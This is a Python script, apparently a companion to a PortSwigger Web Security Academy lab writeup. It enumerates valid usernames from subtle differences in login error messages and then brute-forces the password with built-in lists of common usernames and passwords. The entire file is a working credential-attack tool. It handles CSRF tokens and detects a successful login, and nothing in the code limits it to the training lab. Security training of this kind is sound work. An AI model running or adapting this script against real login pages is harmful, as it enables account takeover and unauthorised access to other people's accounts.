#!/usr/bin/env python3
"""
Username enumeration via subtly different responses
PortSwigger Web Security Academy -- Authentication

Companion script for the writeup: 02-username-enumeration-via-subtly-different-responses.md

What this does:
    Captures a baseline error message for a known-bad username, extracting only the
    rendered error/warning text via regex (not the whole page, which would pick up
    incidental differences like CSRF tokens). Walks the candidate username wordlist
    looking for the one response whose extracted message differs by even a single
    character from the baseline -- falling back to a full response-length compare if
    no message-level regex match surfaces. Then brute-forces the password for the
    identified username.

Usage:
    python 02-username-enumeration-via-subtly-different-responses.py <lab-url>

Requirements:
    pip install httpx
"""

import re
import sys
import httpx

USERNAMES = [
    "carlos", "root", "admin", "test", "guest", "info", "adm", "mysql", "user",
    "administrator", "oracle", "ftp", "pi", "puppet", "ansible", "ec2-user",
    "vagrant", "azureuser", "academico", "acceso", "access", "accounting",
    "accounts", "acid", "activestat", "ad", "adam", "adkit", "admin",
    "administracion", "administrador", "administrator", "administrators",
    "admins", "ads", "adserver", "adsl", "ae", "af", "affiliate", "affiliates",
    "afiliados", "ag", "agenda", "agent", "ai", "aix", "ajax", "ak", "akamai",
    "al", "alabama", "alaska", "albuquerque", "alerts", "alpha", "alterwind",
    "am", "amarillo", "americas", "an", "anaheim", "analyzer", "announce",
    "announcements", "antivirus", "ao", "ap", "apache", "apollo", "app",
    "app01", "app1", "apple", "application", "applications", "apps",
    "appserver", "aq", "ar", "archie", "arcsight", "argentina", "arizona",
    "arkansas", "arlington", "as", "as400", "asia", "asterix", "at", "athena",
    "atlanta", "atlas", "att", "au", "auction", "austin", "auth", "auto",
    "autodiscover",
]

PASSWORDS = [
    "123456", "password", "12345678", "qwerty", "123456789", "12345", "1234",
    "111111", "1234567", "dragon", "123123", "baseball", "abc123", "football",
    "monkey", "letmein", "shadow", "master", "666666", "qwertyuiop", "123321",
    "mustang", "1234567890", "michael", "654321", "superman", "1qaz2wsx",
    "7777777", "121212", "000000", "qazwsx", "123qwe", "killer", "trustno1",
    "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster", "soccer",
    "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000",
    "charlie", "robert", "thomas", "hockey", "ranger", "daniel", "starwars",
    "klaster", "112233", "george", "computer", "michelle", "jessica", "pepper",
    "1111", "zxcvbn", "555555", "11111111", "131313", "freedom", "777777",
    "pass", "maggie", "159753", "aaaaaa", "ginger", "princess", "joshua",
    "cheese", "amanda", "summer", "love", "ashley", "nicole", "chelsea",
    "biteme", "matthew", "access", "yankees", "987654321", "dallas", "austin",
    "thunder", "taylor", "matrix", "mobilemail", "mom", "monitor",
    "monitoring", "montana", "moon", "moscow",
]

ERROR_RE = re.compile(r'(?:class="[^"]*error[^"]*"|is-warning)[^>]*>([^<]+)')


def _csrf(html: str) -> str:
    m = re.search(r'name="csrf"\s+value="([^"]+)"', html)
    return m.group(1) if m else ""


def _error_text(html: str) -> str:
    m = ERROR_RE.search(html)
    return m.group(1).strip() if m else html


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    page = client.get(f"{lab_url}/login")
    baseline = client.post(f"{lab_url}/login", data={
        "csrf": _csrf(page.text), "username": "invalid_user_xyz123", "password": "test"
    })
    baseline_msg = _error_text(baseline.text)
    print(f"[*] Baseline error: '{baseline_msg[:80]}'")

    found_user = None
    for uname in USERNAMES:
        page = client.get(f"{lab_url}/login")
        resp = client.post(f"{lab_url}/login", data={
            "csrf": _csrf(page.text), "username": uname, "password": "test"
        })
        resp_msg = _error_text(resp.text)
        if resp_msg != baseline_msg:
            print(f"[+] Username found: {uname} (msg='{resp_msg[:80]}')")
            found_user = uname
            break

    if not found_user:
        print("[*] No message-level diff found -- falling back to full response length.")
        for uname in USERNAMES:
            page = client.get(f"{lab_url}/login")
            resp = client.post(f"{lab_url}/login", data={
                "csrf": _csrf(page.text), "username": uname, "password": "test"
            })
            if len(resp.text) != len(baseline.text):
                print(f"[+] Username found (length): {uname}")
                found_user = uname
                break

    if not found_user:
        print("[-] No username found.")
        return

    print(f"[*] Brute-forcing password for: {found_user}")
    found_pw = None
    for pw in PASSWORDS:
        page = client.get(f"{lab_url}/login")
        resp = client.post(f"{lab_url}/login", data={
            "csrf": _csrf(page.text), "username": found_user, "password": pw
        })
        if resp.status_code == 302 or "my-account" in getattr(resp.url, "path", ""):
            found_pw = pw
            break

    if found_pw:
        print(f"[+] Password found: {found_pw}")
    else:
        print("[-] No password matched from the candidate list.")

    check = client.get(lab_url)
    if "congratulations" in check.text.lower():
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
